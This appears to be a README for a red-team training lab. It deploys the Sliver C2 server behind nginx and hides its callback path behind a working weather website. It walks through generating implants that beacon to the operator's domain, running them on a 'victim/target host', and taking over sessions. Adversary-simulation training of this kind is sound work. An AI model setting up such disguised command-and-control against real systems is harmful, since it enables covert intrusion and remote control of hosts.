# Sliver C2 Training Environment

A Docker Compose deployment showcasing the Sliver C2 framework for cybersecurity training and demonstration purposes. This environment includes a weather website as a cover application, nginx as a reverse proxy, and Sliver C2 server for command and control operations.

## Overview

This project demonstrates how Sliver C2 can be deployed alongside legitimate web services to provide a realistic training environment for cybersecurity professionals. The setup includes:

- **Nginx**: Reverse proxy handling HTTPS termination and routing
- **Weather Site**: Legitimate-looking weather application serving as a cover while sourcing live data from the Open-Meteo API
- **Sliver C2**: Command and control framework for adversary simulation

## Architecture

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ HTTPS (443)
       ▼
┌─────────────┐
│   Nginx     │ (Reverse Proxy)
│  Port 80/443│
└──────┬──────┘
       │
       ├──────► Weather App (Port 5000) - /weather/
       │             │
       │             └──────► Open-Meteo API (HTTPS) for live forecasts
       └──────► Sliver C2 (Port 8080) - /api/news/
```

### Weather Data Flow

Requests to the cover application's ` /api/weather` endpoint bubble through nginx to the Node weather service. That service:

1. Accepts a city or region query (e.g. `?q=Berlin`) and caches results to limit third-party calls.
2. Uses the Open-Meteo Geocoding API to resolve the location into latitude and longitude.
3. Calls the Open-Meteo Forecast API for current conditions and daily highs/lows in Fahrenheit.
4. Returns a JSON bundle that includes formatted location details, the current snapshot, daily forecast, and raw Open-Meteo payload for debugging.

Because nginx forwards `/api/weather` without rewriting the path, you can inspect the live data stream directly at `${PROTOCOL}://${DOMAIN}/api/weather?q=<city>` once the stack is up.

## Prerequisites

- Docker and Docker Compose installed
- Open ports 80 and (optionally) 443 on your host (or configure custom ports)
- Domain name or IP address for your deployment
- (Optional) Trusted SSL certificates if you do not want to use the autogenerated self-signed option

## Quick Start

### 1. Clone and Navigate

```bash
git clone https://github.com/JongoDB/sliver-weather.git
cd sliver-weather
```

### 2. Configure Environment Variables

Copy the environment template and configure it with your values:

```bash
cp env.template .env
```

Edit `.env` with your preferred editor and set values that match your deployment:

```bash
# Required: Your domain or IP address (used for routing and certificate generation)
DOMAIN=your-domain-or-ip.com

# Enable TLS (HTTPS). When false, nginx serves HTTP only.
USE_TLS=true

# Host directory that stores certificate material mounted into the container.
# Leave the default to use ./certs relative to the project root.
CERTS_HOST_DIR=./certs

# SSL certificate names (will default to ${DOMAIN}.crt and ${DOMAIN}.key)
SSL_CERT_NAME=${DOMAIN}.crt
SSL_KEY_NAME=${DOMAIN}.key

# Optional: Customize ports, paths, etc.
# See env.template for all available options
```

**Important**: The `.env` file is gitignored and will not be committed to the repository. Each user must create their own `.env` file from the template.

### 3. TLS Options

- With `USE_TLS=true` (recommended), the nginx entrypoint looks for `${CERTS_HOST_DIR}/${SSL_CERT_NAME}` and `${CERTS_HOST_DIR}/${SSL_KEY_NAME}` on your host.  
  - If the files are missing, a self-signed certificate/key pair is generated automatically at container startup.  
  - To use trusted certificates, place them in the host directory defined by `CERTS_HOST_DIR` before running the stack.
- With `USE_TLS=false`, nginx renders an HTTP-only configuration; skip any certificate steps and expose only port 80.

**Tip**: You can use an ACME/Let's Encrypt workflow outside the stack to maintain certificates inside `${CERTS_HOST_DIR}` if you need trusted certificates.

### 4. Start the Services

**Important**: Make sure you have created your `.env` file before starting services. The nginx container uses environment variables to configure itself, and missing variables will cause startup failures.

```bash
docker compose up -d --build
```

The `--build` flag ensures containers are rebuilt with the latest configuration. This will:
- Build the nginx, weather, and sliver containers
- Substitute environment variables in nginx configuration at startup
- Start all services

**Note**: If you change your `.env` file after containers are built, you must rebuild the nginx container:
```bash
docker compose build nginx
docker compose up -d
```

**Certificate File Naming**: Ensure any host SSL certificate files in `${CERTS_HOST_DIR}` match the names specified in your `.env` file:
- Certificate file: `${SSL_CERT_NAME}` (default: `${DOMAIN}.crt`)
- Private key file: `${SSL_KEY_NAME}` (default: `${DOMAIN}.key`)

If you rely on the autogenerated self-signed pair, the files are written to `${CERTS_HOST_DIR}` the first time the nginx container runs.

### 5. Access Sliver Server

```bash
docker compose exec -it sliver /bin/bash
```

### 6. Start Sliver Server

Inside the container:

```bash
/opt/sliver-server
```

### 7. Generate an Implant

In the Sliver console, generate a Linux implant. **Note**: You must use your actual domain/IP address - environment variables don't work in the Sliver console.

Replace `your-domain-or-ip.com` with your actual domain or IP from your `.env` file:

```bash
generate --http https://your-domain-or-ip.com:443/api/news/ --os linux --arch amd64 --save /home/sliver/builds
```

**Example** (if your DOMAIN is `example.com`):
```bash
generate --http https://example.com:443/api/news/ --os linux --arch amd64 --save /home/sliver/builds
```

Adjust the protocol and port to match your nginx exposure if you are running HTTP-only (for example, `http://example.com:80/api/news/` when `USE_TLS=false`).

The implant will be saved to `/home/sliver/builds` inside the container, which is mounted to `./builds` on your host.

### 8. Start HTTP Listener

Start the HTTP listener. **Note**: Use the actual port number (default: 8080) - environment variables don't work in the Sliver console:

```bash
http --lport 8080 --lhost 0.0.0.0
```

**Note**: The port number (8080) should match `SLIVER_HTTP_PORT` from your `.env` file (default is 8080).

### 9. Deploy and Execute the Implant

After generating the implant, you need to:

1. **Copy the implant to your victim/target host**:
   ```bash
   # From your host machine
   scp builds/your_implant_name target_host:/tmp/
   # Or use any other method (HTTP server, USB, etc.)
   ```

2. **Execute the implant on the target host**:
   ```bash
   # On the target host
   /tmp/your_implant_name
   ```

3. **Check for active sessions** in the Sliver console:
   ```bash
   sessions
   ```

4. **Interact with a session**:
   ```bash
   use <session-id>
   ```

**Important**: The implant must be executed on the target host for it to establish a connection back to your Sliver C2 server. The implant will attempt to connect to the URL you specified during generation.

## Usage

### Accessing Services

The protocol depends on your `USE_TLS` choice (`https://` when true, `http://` when false). All URLs use your configured `DOMAIN` from the `.env` file:

- **Weather App**: `${PROTOCOL}://${DOMAIN}/weather/`
- **Weather API**: `${PROTOCOL}://${DOMAIN}/api/weather?q=<location>`
- **Sliver C2 Endpoint**: `${PROTOCOL}://${DOMAIN}${SLIVER_C2_PATH}` (default: `/api/news/`)

Use `PROTOCOL=https` when `USE_TLS=true`, otherwise `PROTOCOL=http`.

### Building Implants

Implants are saved to the `builds/` directory, which is mounted as a volume. You can access them from the host at:

```bash
ls -la builds/
```

### Viewing Logs

```bash
# All services
docker compose logs -f

# Specific service
docker compose logs -f nginx
docker compose logs -f weather
docker compose logs -f sliver
```

### Stopping Services

```bash
docker compose down
```

### Cleaning Up

To remove all containers, networks, and volumes:

```bash
docker compose down -v
```

## Configuration

### Environment Variables

The project uses environment variables for universal configuration. All configuration is done through the `.env` file:

- **DOMAIN**: Your domain or IP address (required)
- **USE_TLS**: Enable HTTPS termination (default: `false` in `env.template`)
- **CERTS_HOST_DIR**: Host directory mounted to `/etc/nginx/certs` (default: `./certs`)
- **SSL_CERT_NAME**: SSL certificate filename (defaults to `${DOMAIN}.crt`)
- **SSL_KEY_NAME**: SSL private key filename (defaults to `${DOMAIN}.key`)
- **SLIVER_HTTP_PORT**: Internal Sliver HTTP listener port (default: 8080)
- **SLIVER_C2_PATH**: C2 endpoint path (default: `/api/news/`)
- **NGINX_HTTP_PORT**: External HTTP port (default: 80)
- **NGINX_HTTPS_PORT**: External HTTPS port (default: 443)
- **NETWORK_NAME**: Docker network name (default: `demo_net`)
- **SLIVER_CONFIG_DIR**: Path to Sliver config on host (default: `${HOME}/.sliver`)
- **BUILDS_DIR**: Path to builds directory (default: `./builds`)

See `env.template` for all available options and descriptions.

### Nginx

Nginx configuration templates live under `nginx/` and are rendered at container startup:

- `nginx.conf.template`: HTTPS template with automatic HTTP→HTTPS redirect
- `nginx.http.conf.template`: HTTP-only template (used when `USE_TLS=false`)
- `docker-entrypoint.sh` selects the template, performs env substitution, and generates self-signed certificates when needed
- Routing rules forward `/weather/` and the configured `${SLIVER_C2_PATH}` to their upstream services

### Docker Compose

The `docker-compose.yml` file reads from `.env` and defines:

- **nginx**: Builds custom image with envsubst, exposes configured HTTP/HTTPS ports
- **weather**: Weather application service
- **sliver**: Sliver C2 server with volumes for config and builds

All services use the `.env` file for configuration. The nginx service relies on an entrypoint script that selects the correct template, substitutes environment variables, and (optionally) bootstraps certificates before starting nginx.

### Volumes

- `~/.sliver`: Sliver configuration and certificates
- `./builds`: Generated implant binaries
- `./certs`: Host-mounted TLS material used by nginx (autogenerated when missing and `USE_TLS=true`)

## Security Considerations

⚠️ **This is a training/demonstration environment. Do not deploy in production without proper security hardening.**

1. **SSL Certificates**: Use proper certificates, not self-signed for production
2. **Network Isolation**: Consider running in an isolated network
3. **Access Control**: Limit access to the Sliver server
4. **Logging**: Monitor and log all activities
5. **Firewall**: Restrict access to necessary ports only

## Troubleshooting

### Cannot connect to Sliver

- Verify the HTTP listener is running: `http --lport 8080 --lhost 0.0.0.0`
- Check nginx logs: `docker compose logs nginx`
- Verify routing in nginx.conf matches your implant URL

- Ensure certificates exist in `${CERTS_HOST_DIR}` on the host (default: `./certs`)
- Check certificate file permissions (should be readable by nginx user)
- Verify certificate file names match `${SSL_CERT_NAME}` and `${SSL_KEY_NAME}` from your `.env` file
- Ensure the certificate Common Name (CN) matches your `DOMAIN` value
- If you see "No such file or directory" errors, check that:
  - Your `.env` file exists and has `DOMAIN` set
  - Certificate filenames in `${CERTS_HOST_DIR}` match `SSL_CERT_NAME` and `SSL_KEY_NAME` from `.env`
  - You've rebuilt the nginx container after creating/updating `.env`: `docker compose build nginx`

### Implant Not Connecting

- Verify the URL in the `generate` command matches your actual `DOMAIN` (use the actual value, not `${DOMAIN}`)
- Check that the `SLIVER_C2_PATH` matches the nginx routing configuration
- Verify nginx is routing the C2 path correctly (check nginx logs)
- Ensure the HTTP listener is active in Sliver (`http --lport 8080 --lhost 0.0.0.0`)
- Confirm the listener port matches `SLIVER_HTTP_PORT` from your `.env` file (default: 8080)
- Ensure the implant has been executed on the target host
- Check firewall rules on both the C2 server and target host
- Verify the implant can reach your C2 server's IP/domain on the exposed nginx port (`NGINX_HTTPS_PORT` when `USE_TLS=true`, otherwise `NGINX_HTTP_PORT`)

### Port Conflicts

- Check if ports 80 or 443 are already in use: `sudo netstat -tulpn | grep -E ':(80|443)'`
- Modify port mappings in docker-compose.yml if needed
